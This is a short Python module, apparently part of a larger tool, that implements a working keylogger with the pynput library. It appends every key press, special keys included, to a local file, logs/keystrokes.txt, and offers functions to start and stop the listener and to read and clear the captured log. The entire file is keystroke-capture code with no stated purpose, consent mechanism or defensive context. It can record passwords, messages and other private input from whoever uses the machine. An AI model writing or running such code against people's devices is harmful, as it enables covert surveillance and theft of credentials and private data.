import os

from pynput import keyboard

log_file = "logs/keystrokes.txt"
listener = None
os.makedirs("logs", exist_ok=True)

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def start_keylogger():
    global listener
    if listener is None or not listener.running:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_keylogger():
    global listener
    if listener and listener.running:
        listener.stop()
        listener = None

def read_log():
    try:
        with open(log_file, "r") as f:
            return f.read()
    except FileNotFoundError:
        return "(No keystrokes logged yet)"

def clear_log():
    with open(log_file, "w") as f:
        f.write("")

